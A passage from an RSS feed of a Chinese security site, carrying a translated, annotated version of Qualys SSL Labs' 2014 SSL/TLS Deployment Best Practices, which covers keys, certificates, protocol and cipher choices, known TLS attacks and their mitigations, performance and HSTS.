        <pubDate>Mon, 17 Aug 2015 12:46:00 +0800</pubDate>
        <link>http://www.hardenedlinux.org/system-security/2015/08/17/Grsecurity_catalogue_cn.html</link>
        <guid isPermaLink="true">http://www.hardenedlinux.org/system-security/2015/08/17/Grsecurity_catalogue_cn.html</guid>
        
        
        <category>system-security</category>
        
      </item>
    
      <item>
        <title>SSL/TLS部署最佳实践v1.4</title>
        <description>&lt;p&gt;译者：Shawn the R0ck( 1.3), Tom Li( 1.4)&lt;/p&gt;

&lt;p&gt;Reviewers: Lenx Wei&lt;/p&gt;

&lt;p&gt;原文：&lt;a href=&quot;https://www.ssllabs.com/downloads/SSL_TLS_Deployment_Best_Practices.pdf&quot;&gt;SSL/TLS Deployment Best Practices&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;作者：Ivan Ristić&lt;/p&gt;

&lt;p&gt;version 1.4 (8 December 2014)&lt;/p&gt;

&lt;p&gt;Copyright © 2012-2014 Qualys SSL Labs&lt;/p&gt;

&lt;h2 id=&quot;section&quot;&gt;摘要：&lt;/h2&gt;

&lt;p&gt;SSL/TLS是一个看似简单的技术。非常容易部署和让她跑起来，但是…她真的跑
起来了吗？第一部分是真的 —— SSL确实容易部署 —— 然而正确部属她并不容易。
为了确保TLS提供安全性，系统管理员和开发者必须投入额外的精力，去配置服务器和
编写应用程序。&lt;/p&gt;

&lt;p&gt;2009年，我们在&lt;a href=&quot;https://www.ssllabs.com/&quot;&gt;SSL Labs&lt;/a&gt;开始了相关工作，因为我
们想明白TLS到底是在怎么样被使用，我们也打算弥补TLS缺乏易用的工具和文档
的局面。我们进行了对全局TLS使用情况的完整调查，以及实现了在线检测工具，但文
档缺乏的问题依然存在。这份文档是解决这个问题过程中的一步。&lt;/p&gt;

&lt;p&gt;我们的目标是让已经不堪负重的系统管理员和程序员尽可能花费少量时间就能完
成安全站点或Web应用的部署，正是因为我们的目的如此，所以这份文档可能不够完备，遗漏了
一些高级主题。因此，我们只提供简单实用容易理解的建议。
对于那些想了解更多信息的读者，可以看看 Section 6。&lt;/p&gt;

&lt;h2 id=&quot;section-1&quot;&gt;1. 私钥和证书&lt;/h2&gt;

&lt;p&gt;TLS提供的安全质量完全依赖于私钥和证书。私钥是安全的基础，而证书则用于向访问者表明
服务器的身份。&lt;/p&gt;

&lt;h3 id=&quot;section-2&quot;&gt;1.1 使用2048位的私钥&lt;/h3&gt;

&lt;p&gt;在你的所有服务器上使用2048位的RSA，或者等价强度的256位ECDSA私钥。密钥的强度能
保证在相当长时间内的安全，如果你已经使用1024位的RSA，尽快替换它们。如果你
的安全需求必须使用大于2048位的密钥，请考虑ECDSA，因为性能不错。不过ECDSA的缺点
是小部分客户端不支持，因此你有可能需要同时部署RSA和ECDSA以确保互操作性。&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Lenx注：RSA 1024的强度相当于分组加密的80-96bit，已经被视为不安全。[T1]&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h3 id=&quot;section-3&quot;&gt;1.2 保护私钥&lt;/h3&gt;

&lt;p&gt;私钥是重要的资产，尽可能限制能接触到私钥的人。推荐策略包括：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;在一台可信的计算机(Shawn注:加固过的物理机器)上生成私钥和CSR(
Certificate Signing Requests)。有一些CA会为你生成密钥和CSR，但这样做
明显不妥。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;受密码保护的密钥可以防止从备份系统中泄漏。然而私钥密码在生产系统中使用的
帮助是有限的，因为这并不能阻止一个聪明的攻击者从进程内存中截获私钥。
一些硬件设备可以在服务器被攻陷的情况下确保私钥安全，但这些昂贵的设备
只在对安全有严格要求的机构中使用。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;在发现系统被攻陷后，吊销老的证书，生成新的密钥和证书。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;每年更新证书，同时更新私钥。&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;section-4&quot;&gt;1.3 确保充分的域名覆盖&lt;/h3&gt;

&lt;p&gt;确保你的证书覆盖到目标站点的所有活跃域名。比如你的主站是www.example.com，但
你可能还有个www.example.net。你的目标就是避免无效证书警告，因为那会让你
的用户产生疑惑从而影响对你的信任。&lt;/p&gt;

&lt;p&gt;即使你的服务器只有一个主机名配置，也要记得你不能控制用户是通过什么路径
访问你的站点的，可能是其他的链接过来的。大部分情况下，你应该保证证书能
在没有www前缀的情况下工作(比如，example.com和www.example.com)。这里经验法则
就是：一个安全的WEB服务器应该有一个对所有DNS名称解析都合法的证书配置。&lt;/p&gt;

&lt;p&gt;通配符证书(Wildcard certificates)有它的适用场景。但如果这样的配置意味着
暴露私钥给不必要的人群（特别是在跨越部门边界的情形下），则应该避免使用。
换句话说，越少的人能访问私钥越好。此外，要意识到共享证书可能会导致安全漏洞
从一个站点扩散到所有使用相同证书的站点。&lt;/p&gt;

&lt;h3 id=&quot;ca&quot;&gt;1.4 从靠谱的CA那里获得证书&lt;/h3&gt;

&lt;p&gt;选择一个对待安全业务认真可靠的CA( Certificate Authority)。在选择CA过程
中考虑以下因素：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;对待安全的态度&lt;/p&gt;

    &lt;p&gt;大多的CA都会有常规的安全审计（否则根本没有资格当CA），但是其中一些会更重视
安全。搞清楚哪些更重视安全不是一件容易的事情，但一个可行的做法
是看看他们在安全方面的历史状况，他们如何响应攻击事件以及如何从错误中学习。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;足够大的市场占有率&lt;/p&gt;

    &lt;p&gt;满足此因素的CA不太可能轻易撤销所有证书，而这种事情过去曾发生在小的CA身上。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;业务重心&lt;/p&gt;

    &lt;p&gt;如果一家机构的核心业务是CA，那么一旦出现严重问题，他们将会受到严重影响。
因此这些CA不太可能因为追逐利润而忽视证书部门的重要性。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;提供哪些服务&lt;/p&gt;

    &lt;p&gt;在最底线的情况，你选择的CA至少应该提供CRL( Certificate List)和OCSP(
Online Certificate Status Protocol)这两种召回机制，并且提供一个高性能的OCSP服务。
CA至少提供域名验证和扩展证书验证功能，最理想的情况可以让你自己选择公
钥算法(今天大多站点都使用RSA，但在未来ECDSA的性能优势可能会变得重要。)&lt;/p&gt;

    &lt;blockquote&gt;
      &lt;p&gt;Shawn注：这里作者可能指的是ECDH/ECDHE_ECDSA，即ECDH密钥交换+ECDSA签名的证书或者ECDH算出TLS的临时session key+ECDSA签名&lt;/p&gt;
    &lt;/blockquote&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;证书管理选项&lt;/p&gt;

    &lt;p&gt;如果你的运维环境很复杂，需要一大堆的证书，那么选择一个能提供良好管理工具的
CA。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;技术支持&lt;/p&gt;

    &lt;p&gt;选择一个技术支持优秀的CA提供商。&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;section-5&quot;&gt;1.5 选择强算法签名证书&lt;/h3&gt;

&lt;p&gt;证书签名的安全依赖于签名私钥的强度，以及所使用的哈希函数强度。
今天大多数证书使用并不足够安全的SHA1哈希函数。业界正在逐渐
淘汰SHA1，而最后期限则是2016年末，这之后SHA1证书就不可接受了。&lt;/p&gt;

&lt;p&gt;然而，Google Chrome在大限到来之前就开始对SHA1证书发出警告，如果你的证书
在2015年左右就要到期，你应该立刻替换这些证书。作为替代，你可以直奔SHA2
算法家族。不过在你动手之前，你需要先看看你的用户是否支持SHA2。一些旧客户
端，例如 Windows XP SP2 的 IE 6 就不支持（但依然在一些国家和机构重度使用）。&lt;/p&gt;

&lt;h2 id=&quot;section-6&quot;&gt;2. 配置&lt;/h2&gt;

&lt;p&gt;使用正确的TLS服务器配置，才能够确保将你的信任凭证正确的展现给站点的访问者，
确保只有安全的加密原语被使用，而且确保规避所有已知的安全风险。&lt;/p&gt;

&lt;h3 id=&quot;section-7&quot;&gt;2.1 部署有效的证书链&lt;/h3&gt;

&lt;p&gt;一个无效证书链会导致服务器证书失效和客户端浏览器报警告，这个问题有时候
不是那么容易被检测到，因为有些浏览器可以自己重构一个完整的信任链而有些
则不行。&lt;/p&gt;

&lt;p&gt;在绝大多数部署场景中，仅服务器自身一个证书是不够的。一般需要多个证书建立一个信
任链。一个常见的问题是正确的配置了服务器证书但却忘了包含其他所需要的
证书。此外，虽然这些其他的证书通常有很长的有效期，但它们也会过期。而且一旦它们过
期就会使整个信任链作废。你的CA应该向你提供所有额外需要的证书。&lt;/p&gt;

&lt;p&gt;一个无效证书链会导致服务器证书失效，并且导致客户端浏览器报警。而实际上，这个问题有时候
难以诊断，因为有些浏览器可以自己重构一个完整的信任链而其他浏览器则不行。&lt;/p&gt;

&lt;h3 id=&quot;section-8&quot;&gt;2.2 使用安全的协议&lt;/h3&gt;

&lt;p&gt;在SSL/TLS家族中有5种协议：SSLv2, SSL v3, TLS v1.0, TLS v1.1, TLS v1.2。&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Shawn注: TLS v1.3还在draft阶段&lt;/p&gt;
&lt;/blockquote&gt;

&lt;ul&gt;
  &lt;li&gt;SSL v2不安全，坚决不能用。&lt;/li&gt;
&lt;/ul&gt;

&lt;blockquote&gt;
  &lt;p&gt;Shawn注: OpenSSL和GnuTLS当前的版本(2014.12.2)不支持SSL v2&lt;/p&gt;
&lt;/blockquote&gt;

&lt;ul&gt;
  &lt;li&gt;SSL v3用于HTTP已经被确认为不安全，用于其他协议时安全强度也不足。
它已经过时，不应该再被使用。&lt;/li&gt;
&lt;/ul&gt;

&lt;blockquote&gt;
  &lt;p&gt;Tom Li注: POODLE漏洞的出现彻底的废掉了SSLv3，受其影响，
  大量程序和库彻底取消了对SSLv3的支持。其实之前很多地方支持SSLv3
  的原因是兼容性问题。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;TLS v1.0在很大程度上是安全的。当用于非HTTP协议时，我们还不知道存在任何
已知的重大安全漏洞。当用于HTTP协议时，我们能够通过精心的服务器配置，来保证
它几乎是安全的。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;TLS v1.1和TLS v1.2没有已知的安全漏洞曝光。&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;blockquote&gt;
  &lt;p&gt;Shawn注: 由于Edward Snowden曝光的内容有关于NSA“今天记录，明天解密”的故事，
  所以大量的自由软件社区和暗网使者们在过去1年中(2013.7–2014)转向了TLS v1.2的PFS，2015年4月，[PCI-DSS v3.1] (https://www.pcisecuritystandards.org/documents/PCI_DSS_v3-1.pdf)规定所有SSL的版本以及早期TLS版本将于2016年6月30日后不再支持)&lt;/p&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;Lenx注：某一些TLS 1.x实现由于没有正确实现对PADDING的校验，同样存在POODLE脆弱性问题。
  这些有问题的TLS实现包括F5，A10，Checkpoint, Cisco等厂家的设备。
  同样，Lucky 13攻击一样对老版本的OpenSSL, GnuTLS，F5等大量库/设备实现有效。
  请确认打上补丁。[T2][T3]&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;TLS v1.2应该成为你的主要协议。这个版本有巨大的优势是因为它有之前版本
没有的特性。如果你的服务器平台（或中间设备）不支持TLS v1.2，做个升
级计划吧。如果你的服务提供商不支持TLS v1.2，要求他们升级。&lt;/p&gt;

&lt;p&gt;对于那些老的客户端，你还是需要继续支持TLS v1.0和TLS v1.1。使用临时的解
决方案（接下来会介绍），这些协议对于大多WEB站点依然被认为是足够安全的。&lt;/p&gt;

&lt;h3 id=&quot;cipher-suite&quot;&gt;2.3 使用安全的加密套件(Cipher Suite)&lt;/h3&gt;

&lt;p&gt;要安全的通信，首先得保证你是和你想通信的另一方直接通信（而不是
冒充者或者存在能够监听的中间人），并且安全的交换数据。
在SSL/TLS里，加密套件是定义你如何安全通信的。
它们由一堆多样化的组件组成，以确保安全。如果其中一个组件被发现是不安全的，
你应该切换到其他的组件上。&lt;/p&gt;

&lt;p&gt;你的目标应该是仅使用128位或者更强的加密、认证套件，其他都应该被排除掉：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Anonymous Diffie-Hellman (ADH) 套件不提供认证功能&lt;/li&gt;
  &lt;li&gt;NULL cipher suites不提供加密&lt;/li&gt;
  &lt;li&gt;出口密钥交换套件 (Export key exchange suites) 使用容易被破解的认证&lt;/li&gt;
  &lt;li&gt;使用强度不够的加密算法(比如40或者56位的加密强度)也容易被破解&lt;/li&gt;
  &lt;li&gt;RC4比之前想象的要弱，你应该在检查好兼容问题后，尽快去除掉&lt;/li&gt;
&lt;/ul&gt;

&lt;blockquote&gt;
  &lt;p&gt;Tom Li 注：2015年三月曝光的手段将RC4攻击实用化，RC4坚决不要再用 [T4]&lt;/p&gt;
&lt;/blockquote&gt;

&lt;ul&gt;
  &lt;li&gt;3DES仅提供大约112位的安全系数，这也低于推荐的最低128位，不过依然足够强。
但实践中更大的问题是，她比其他替代算法要慢很多。所以，出于性能我们不推荐她，
但她依然可以放在加密套件的最后面，用来兼容非常陈旧的客户端&lt;/li&gt;
&lt;/ul&gt;

&lt;blockquote&gt;
  &lt;p&gt;Tom Li 注：RC4安全漏洞曝光后，这是老旧客户端唯一能用的算法了&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h3 id=&quot;section-9&quot;&gt;2.4 控制加密套件选型&lt;/h3&gt;

&lt;p&gt;在SSL v3和后来的版本里，客户端提交一个她支持的加密套件的列表，服务
器从列表中选择一个去跟客户端做协商，以构建一个安全的通信信道。
然而不是所有的服务器都能很好处理这个过程，一些服务器仅仅会简单的从列表中选择第一个。
让服务器选择正确的加密套件对于安全而言是极端重要的（详见 Section 2.7）。&lt;/p&gt;

&lt;h3 id=&quot;forward-secrecy&quot;&gt;2.5 支持正向安全（Forward Secrecy）&lt;/h3&gt;

&lt;p&gt;正向安全是一个协议特性，它使得安全会话不依赖于服务器的私钥。
当使用不支持正向安全的加密套件时，如果攻击者记录了通信内容，那么她可
以在未来获得私钥后，再解密先前的一切通信。你需要优先支持ECDHE套装，
来让浏览器选择支持正向安全。
为了支持更广泛的客户端，可将DHE套件作为ECDHE的协商回退（fallback)方案。&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Shawn注: NSA就在干这件事情，所以看出PFS有多重要了吧&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h3 id=&quot;section-10&quot;&gt;2.6 关闭客户端发起的重协商&lt;/h3&gt;

&lt;p&gt;在SSL/TLS里，重协商允许一方停止交换数据而去重新协商一个安全会话。有一些
场景需要服务器发起重协商的请求，但客户端并没有发起重协商请求的必要。此
外，曾经出现过客户端发起重协商请求的拒绝服务攻击。&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Shawn注解: 每个重协商请求服务器的计算量是客户端的15倍&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h3 id=&quot;section-11&quot;&gt;2.7 降低已知漏洞风险&lt;/h3&gt;

&lt;p&gt;没有什么是绝对安全的，很多防护方案都会随着时间推移成为安全问题。最佳实
践是随时关注信息安全的世界在发生些什么，然后采取必要的措施。最简单的是你
应该尽快的打每一个补丁。&lt;/p&gt;

&lt;p&gt;下面的一些问题应该引起你的注意：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;关闭不安全的重协商&lt;/p&gt;

    &lt;p&gt;重协商特性在2009年时被发现是不安全的，协议需要更新。今天大部分厂商已
经修复，至少提供了一个临时方案。不安全的重协商很危险，因为她很容易被
利用，用来进行跨站请求伪造（CSFR）攻击，并在某些情况下引发跨站脚本（XSS）
攻击。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;关闭TLS压缩&lt;/p&gt;

    &lt;p&gt;2012年，CRIME攻击[6]向我们展示了TLS压缩所导致的信息泄漏可以被攻击者用
于还原部分的敏感数据(比如session cookies)。只有几款客户端支持TLS
压缩（而现在就更少了），所以即使关掉TLS压缩，也完全不会遇到服务器性能
问题。针对TLS压缩的攻击风险有限。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;降低HTTP压缩的信息泄漏风险&lt;/p&gt;

    &lt;p&gt;2个CRIME的变种攻击在2013年被曝光，不像CRIME针对TLS压缩，TIME和BREACH
漏洞是针对压缩过的HTTP响应。HTTP压缩对于很多公司都很重要，这个
问题不容易解决。风险减缓方案可能需要修改业务代码。&lt;/p&gt;

    &lt;p&gt;对于TIME和BREACH攻击，只要攻击者有足够攻击你的理由，那影响等同于CSRF。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;关闭RC4&lt;/p&gt;

    &lt;p&gt;RC4 cihpersuites已经被认为是不安全而且应该关闭。目前，对于攻击者最好
的情况需要百万次的请求，和大量的带宽。因此危害是比较低的，不过我们期待
未来有改进的攻击手法。在去除RC4之前，检查这是否会影响现有的用户；换句话
说，你应该查查有没有仅支持RC4的客户端。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;注意BEAST攻击&lt;/p&gt;

    &lt;p&gt;2011年曝光的BEAST攻击是2004年的一个针对TLS 1.0或者更早版本但当时被认
为很难被利用的一个漏洞。一次成功的BEAST攻击的影响约等于会话劫持。在一段时间内，
尽管问题出在客户端，在服务端避免BEAST攻击是合适的。但不幸的是，
服务器需要使用RC4来避免问题，而这已经不再推荐了。因为这个原因，再加上
目前BEAST攻击已经在大量客户端中被解决了，我们不再推荐在服务端避免攻击。
在有大量旧客户端受BEAST攻击影响的情况下，使用RC4和TLS 1.0也许更安全。
如何取舍需要在完全了解环境，建立威胁模型后小心决定。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;关闭SSLv3&lt;/p&gt;

    &lt;p&gt;SSLv3受到2014年10月曝光的POODLE攻击威胁。此攻击很容易被利用来攻击HTTP客户端运行
JavaScript恶意程序。客户端也很容易被攻击者忽悠，从一个更安全的协议（如 TLSv1.2）
降级到不安全的SSLv3。因此最好的解决方案是在服务器完全禁用SSLv3，绝大多数站点都
可以安全的实施。&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;blockquote&gt;
  &lt;p&gt;Lenx注: 由于国内仍然存在大量IE 6客户端，不支持TLS 1.x。目前如果必须
  要支持SSLv3，那么只能选择RC4，并注意开启TLS_FALLBACK_SCSV防止降级攻击。
  此外注意库的及时升级，相关漏洞是一茬接着一茬的。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;section-12&quot;&gt;3. 性能&lt;/h2&gt;

&lt;p&gt;这份文档中安全是主要关注点，但我们也必须注意到性能的问题。一个安全服
务不能满足性能需求无疑会被遗弃掉。然而，因为TLS配置通常不会带来很大的性
能开销，我们把讨论限定在会导致严重性能下降的常见配置问题上。&lt;/p&gt;

&lt;h3 id=&quot;section-13&quot;&gt;3.1 不要使用强度过高的私钥&lt;/h3&gt;

&lt;p&gt;在建立一条安全连接的密钥协商的过程当中最大的开销是由私钥大小决定的，使
用密钥过短会不安全，使用密钥过长会的导致在一些场景无法忍受的性能下降。
对于大多的WEB站点，使用超过2048位的RSA/DHE密钥，或者超过256位的ECDSA/ECDHE密钥是浪
费CPU和影响用户体验的。&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Shawn注：256-bit的&lt;a href=&quot;https://tools.ietf.org/html/rfc4492&quot;&gt;ECC密钥强度&lt;/a&gt;足够胜任很长一段时间&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h3 id=&quot;session&quot;&gt;3.2 确保正确使用Session重用&lt;/h3&gt;

&lt;p&gt;Session重用是一种性能优化技术，让耗时的密码计算操作的结果在一段时间里可重复使
用。当Session重用机制失效时可能会导致严重性能下降。&lt;/p&gt;

&lt;h3 id=&quot;http&quot;&gt;3.3 使用持久性链接(HTTP)&lt;/h3&gt;

&lt;p&gt;今天绝大多数SSL开销并非来自CPU密集型的密码计算操作，而是网络延迟。一个TLS握
手是建立在TCP握手结束后，她需要交换更多的数据包。为了让网络延迟最小化，
你应该启用HTTP持久化( keep-alives)，从而让你的用户能在一个TCP链接上发多次
HTTP请求。&lt;/p&gt;

&lt;h3 id=&quot;http-1&quot;&gt;3.4 为公共资源开启缓存(HTTP)&lt;/h3&gt;

&lt;p&gt;当使用TLS通信时，浏览器会假设所有的流量都是敏感信息。浏览器会把一些特定的
资源缓存到内存里，但是一旦你关闭了浏览器，这些内容就丢失了。为了提升性
能，为一些资源开启长期缓存，通过加入”Cache-Control: public”返回header给
浏览器标记为公共资源（比如图片）。&lt;/p&gt;

&lt;h3 id=&quot;ocsp-stapling&quot;&gt;3.5 使用 OCSP Stapling&lt;/h3&gt;

&lt;p&gt;OCSP Staling是改版的OSCP协议，使得传递证书吊销信息成为TLS握手的一部分，直接
从服务器传递到浏览器。因此，浏览器不再需要额外联系OCSP服务器来验证服务器，
从而大幅降低连接耗时。&lt;/p&gt;

&lt;h2 id=&quot;http-2&quot;&gt;4. 应用设计（HTTP）&lt;/h2&gt;

&lt;p&gt;HTTP协议和WEB相关平台在SSL诞生后仍然在不断的进化。进化的结果就是有一些
今天包含的特性已经对加密不利。在这个Section里，我们会罗列出这些特性，也
包括如何安全的使用它们。&lt;/p&gt;

&lt;h3 id=&quot;section-14&quot;&gt;4.1 100%的加密你的网站&lt;/h3&gt;

&lt;p&gt;事实上”加密是一个备选“的思想大概是今天最严重的安全问题之一。我们来看看
以下问题：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;网站应该用TLS但没用&lt;/li&gt;
  &lt;li&gt;网站有TLS但不是强制性的使用&lt;/li&gt;
  &lt;li&gt;网站混合了TLS和非TLS的内容，有时候甚至在相同的网页上&lt;/li&gt;
  &lt;li&gt;网站编程错误导致TLS被攻陷&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;虽然如果你知道你自己在做什么的话，这些问题大部分是可以避免的。然而一般而言，
唯一有效的方式是强制对所有的内容通信进行加密 —— 没有豁免。&lt;/p&gt;

&lt;h3 id=&quot;section-15&quot;&gt;4.2 避免混合内容&lt;/h3&gt;

&lt;p&gt;混合内容的页面是已经使用TLS，但有些资源（比如JavaScript文件，图片，
CSS）是通过非TLS的方式传输的。这些页面不安全，主动的中间人攻击者可以劫持这
些不受保护的JavaScript的资源，从而……例如劫持整个用户会话。就算你遵循了前面的
建议加密了自己网站上所有的内容，但也不排除来自第三方网站的资源是没有加密的。&lt;/p&gt;

&lt;h3 id=&quot;section-16&quot;&gt;4.3 理解信任第三方&lt;/h3&gt;

&lt;p&gt;网站通常会通过来自其他服务器的JavaScript代码来使用第三方的服务，Google Analytics是一个
应用广泛的例子。内含的第三方代码创建了一个隐式的信任链，让第三方可以完
全控制你的网站。第三方本身可能并没有恶意，但他们很容易成为攻击者的目标。
原因很简单，如果一个大型第三方提供商被攻陷，那攻击者就可以利用这一路径
导致所有使用它的人全都自动被攻陷。&lt;/p&gt;

&lt;p&gt;如果你采纳了Section 4.2的建议，至少你的第三方链接在加密后可以防止中间人
攻击。此外，你应该进一步去了解你的站点使用了哪些服务，去除、替换或者承担其中的
风险并继续使用。&lt;/p&gt;

&lt;h3 id=&quot;cookies&quot;&gt;4.4 安全Cookies&lt;/h3&gt;

&lt;p&gt;为了安全，网站需要TLS。然而网站使用的cookies也要标记为安全。如果不能保护cookies，就
让中间人攻击者使用诡计获取信息成为可能，即使网站本身是100%加密的。&lt;/p&gt;

&lt;h3 id=&quot;hsts&quot;&gt;4.5 部署HSTS&lt;/h3&gt;

&lt;p&gt;HTTP严格传输安全（HSTS）是TLS协议的保护伞：它被设计成即使存在配置和实现错误的情况下，依然能保证安全。
设置一个简单的响应header就能在支持HSTS的浏览器（目前是 Chrome、FireFox、Safari 和
Opear，IE 很快就会支持）上激活保护。&lt;/p&gt;

&lt;p&gt;HSTS的目的是很简单的：在激活之后，它就会禁止与网站进行任何不安全通信，自动把明文链接转换
成安全链接。一个额外的特性让用户不能无视证书警告（证书警告是
中间人攻击的标志，而研究表明大多数用户都会无视警告，最好永远不要让用户这么做）&lt;/p&gt;

&lt;p&gt;支持HSTS是一项能大幅度提高你网站TLS安全性的措施。新的网站应该在设计的时候就考虑到HSTS，而旧的
站点则应该尽快支持。&lt;/p&gt;

&lt;h3 id=&quot;section-17&quot;&gt;4.6 关闭敏感内容的缓存&lt;/h3&gt;

&lt;p&gt;敏感内容应该被确实看作是敏感，只能发送给该知道的一方。尽管代理服务器看不到加密流量，
也不能把它共享给别人，但是随着基于云的应用在增加，你必须得小心区分公开资源和敏感内容。&lt;/p&gt;

&lt;h3 id=&quot;section-18&quot;&gt;4.7 确保没有其他漏洞&lt;/h3&gt;

&lt;p&gt;TLS不代表就安全，TLS的设计只是涉及安全的一个方面–通信过程中的保密性和
完整性——但还有其他威胁你必须面对。&lt;/p&gt;

&lt;h2 id=&quot;validation&quot;&gt;5. Validation&lt;/h2&gt;

&lt;p&gt;在配置的时候可以进行调整的参数有一大堆，而你很难完全了解修改什么会有什么影响，
而有些时候改动可能是无意的；软件升级也会悄悄引入变化。因此，我们建议使用一款
SSL/TLS评估工具来检查你的配置是不是真的安全，并定期运行检查保证你一直都安全。
对于公开站点，我们推荐使用&lt;a href=&quot;https://www.ssllabs.com/ssltest/&quot;&gt;SSLLab网站上的免费在线工具&lt;/a&gt;
它的“握手模拟”功能在实践中非常有用，可以让不同的TLS客户端连接时时候的参数一清二楚。&lt;/p&gt;

&lt;h2 id=&quot;section-19&quot;&gt;6. 高级议题&lt;/h2&gt;

&lt;p&gt;下面的这些议题超出了这份文档的范畴，她们需要对SSL/TLS和公钥架构(PKI)有
更深的理解，这些议题依然是受到争议的。&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;Extended Validation证书&lt;/p&gt;

    &lt;p&gt;EV证书是很靠谱的证书，只有经过充分的线下审核后才给予颁发。证书的目的是明确
机构和它的对应线上网站的身份联系。EV证书更难伪造，提供了更好的安全性，
并且在浏览器上呈现给用户时的待遇也更高。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Public key pinning&lt;/p&gt;

    &lt;p&gt;Public key pinning的设计是为网站运维能限制哪些CA才可以为他们的网站签
发证书。这个特性是Google开发的，目前已经硬编码到了Chrome浏览器里面，
并且证明对避免攻击和引发大众关注非常有效。在2014年，FireFox也加入了对
硬编码pinning的支持。一个叫做《HTTP的Pubilc Key Pinning扩展》的标准已经
发展了很长时间了，很快讲会发布。我们期待这个特性今后至少被主流浏览器支持。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;ECDSA私钥&lt;/p&gt;

    &lt;p&gt;事实上所有的网站都依赖于RSA私钥。这个算法是WEB通信安全的基础。因为一
些原因，我们正在从1024位转向2048位的RSA密钥。而增加密钥长度可能会带来
性能问题。椭圆曲线密码学(ECC)使用了不同的数学，能在较小的密钥长度下有
较强的安全性。RSA密钥可以被ECDSA替代，目前只有少数的CA支持ECDSA，但我
们期待未来会有更多。在迁移到ECDSA的时候，一个主要的问题是并非所有的
客户端都支持它，如果你考虑使用ECDSA，应该确认它是否会影响用户连接服务器。
有些平台支持双密钥部署，可以让你同时使用RSA和ECDSA以适配所有的客户端。&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;改动&lt;/p&gt;

&lt;p&gt;这份文档的最初的版本是在2012年2月24日发布的。这个Section跟踪了文档修改
的时间，从1.3开始。&lt;/p&gt;

&lt;p&gt;版本 1.3 (2013年9月17日)
此版本的改动有：
• 推荐替换1024位证书
• 推荐不对SSLv3进行支持
• 删去推荐使用RC4来服务端避免BEAST攻击的内容
• 推荐禁用RC4
• 推荐在未来禁用3DES
• 警告关于CRIME攻击的变种（TIME和BREACH攻击）
• 推荐支持正向安全
• 加入对ECDSA证书的讨论&lt;/p&gt;

&lt;p&gt;版本 1.4 (2014年12月8日）
此版本的改动有：
• 讨论SHA1过时的问题，推荐迁移到SHA2系列算法
• 推荐禁用SSLv3，提及POODLE攻击
• 扩张Sectios 3.1，涵盖DHE和ECDHE密钥交换强度
• 推荐OCSP Stap&lt;/p&gt;

&lt;p&gt;感谢&lt;/p&gt;

&lt;p&gt;为了有价值的反馈和起草这份文档，特别感谢Marsh Ray (PhoneFactor), Nasko
Oskov (Google), Adrian F. Dimcev和Ryan Hurst(GlobalSign)。也感谢其他慷
慨的分享关于信息安全和密码学的人。这份文档虽然是我写的，但这些内容则来
自整个安全社区。&lt;/p&gt;

&lt;p&gt;关于SSL Labs
……………..&lt;/p&gt;

&lt;p&gt;关于Qualys
…………….&lt;/p&gt;

&lt;p&gt;[1] SHA1 Deprecation Policy (Windows PKI blog, 12 November 2013)
http://blogs.technet.com/b/pki/archive/2013/11/12/sha1-deprecation-policy.aspx&lt;/p&gt;

&lt;p&gt;[2] Gradually Sunsetting SHA-1 (The Chromium Blog, 5 September 2014)
http://blog.chromium.org/2014/09/gradually-sunsetting-sha-1.html&lt;/p&gt;

&lt;p&gt;[3] On the Security of RC4 in TLS and WPA (Kenny Paterson et al.; 13 March 2013)
http://www.isg.rhul.ac.uk/tls/&lt;/p&gt;

&lt;p&gt;[4] Deploying Forward Secrecy (Qualys Security Labs; 25 June 2013)
